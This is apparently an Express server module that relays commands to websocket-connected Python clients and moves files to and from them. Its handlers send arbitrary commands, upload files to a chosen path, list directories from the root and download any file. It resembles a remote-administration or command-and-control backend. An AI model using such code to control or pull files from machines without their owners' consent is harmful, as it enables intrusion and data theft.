import { response } from "express";
import sendToPython from "../Utils/socket_file.mjs";

const send_cmd = async (clients, req, res) => {
    const clientId = req.params.id;
    const client = clients.get(clientId);

    if (!client || client.readyState !== 1) {
        return res.status(404).json({ error: 'Cliente no conectado' });
    }

    const msgHandler = (msg) => {
        try {
            const parsed = JSON.parse(msg);
            res.status(200).json(parsed);
        } catch (e) {
            res.status(200).json({ result: msg });
        }
        client.off('message', msgHandler);
    };

    client.on('message', msgHandler);
    client.send(JSON.stringify(req.body));

    setTimeout(() => {
        client.off('message', msgHandler);
        if (!res.headersSent) {
            res.status(504).json({ error: 'Timeout esperando respuesta del cliente' });
        }
    }, 5000);
};

const upload_file = async(clients,req,res) => {

    try {

        const clientId = req.params.id;
        const client = clients.get(clientId);

        const destination=req.body.destination;
        
        
        if (!client || client.readyState !== 1) {
            return res.status(404).json({ error: 'Cliente no conectado' });
        }


        
        // Envía el comando
        
        const chunkSize = 64 * 1024; // 64 KB
        const buffer = req.file.buffer;
        
        
        let offset = 0;
        while (offset < buffer.length) {
            const chunk = buffer.slice(offset, offset + chunkSize);
            client.send(JSON.stringify({
                destination,
                chunk: {
                    data: chunk.toString('base64'), // conviertes a base64
                    last: offset + chunkSize >= buffer.length
                }
            }));
            offset += chunkSize;
        }


        return res.status(200).json({msg:"Subida correcta"})
        
    } catch (error) {
        return res.status(400).json({msg:"Error al subir"})
    }

};


const getFiles= async(clients, req, res = response) => {

    const path = req.query.path || "/";
    const clientId = req.params.id;
    const client = clients.get(clientId);


    if (!client || client.readyState !== 1) {
        return res.status(404).json({ error: 'Cliente no conectado' });
    }

    const msgHandler = (msg) => {
        try {
            const parsed = JSON.parse(msg);
            res.status(200).json(parsed);
        } catch (e) {
            res.status(200).json({ result: msg });
        }
        client.off('message', msgHandler);
    };

    client.on('message', msgHandler);
    client.send(JSON.stringify({list_files:"list_files", path}));

    setTimeout(() => {
        client.off('message', msgHandler);
        if (!res.headersSent) {
            res.status(504).json({ error: 'Timeout esperando respuesta del cliente' });
        }
    }, 5000);

    
};

// 📄 Descargar archivo
const downloadFiles=async (clients, req, res = response) => {
    const path = req.query.path || "/";
    const clientId = req.params.id;
    const client = clients.get(clientId);

    if (!client || client.readyState !== 1) {
        return res.status(404).json({ error: 'Cliente no conectado' });
    }

    // Handler que se ejecuta al recibir mensaje del cliente Python
    const msgHandler = (msg) => {
        try {
            const parsed = JSON.parse(msg);

            // Validamos si llegó contenido base64
            if (parsed.content) {
                const fileBuffer = Buffer.from(parsed.content, "base64");
                res.setHeader("Content-Disposition", `attachment; filename="${parsed.filename || "archivo.bin"}"`);
                res.setHeader("Content-Type", "application/octet-stream");
                res.send(fileBuffer);
            } else {
                res.status(404).json({ error: parsed.error || "Archivo no encontrado" });
            }
        } catch (e) {
            res.status(500).json({ error: "Error procesando archivo" });
        }

        // Limpiamos el listener
        client.off('message', msgHandler);
    };

    client.on('message', msgHandler);

    // Enviar solicitud de archivo al cliente Python
    client.send(JSON.stringify({ get_files: path }));

    // Timeout para evitar dejar colgado el cliente si no responde
    setTimeout(() => {
        client.off('message', msgHandler);
        if (!res.headersSent) {
            res.status(504).json({ error: 'Timeout esperando respuesta del cliente' });
        }
    }, 5000);
};




export{ send_cmd, upload_file, getFiles, downloadFiles }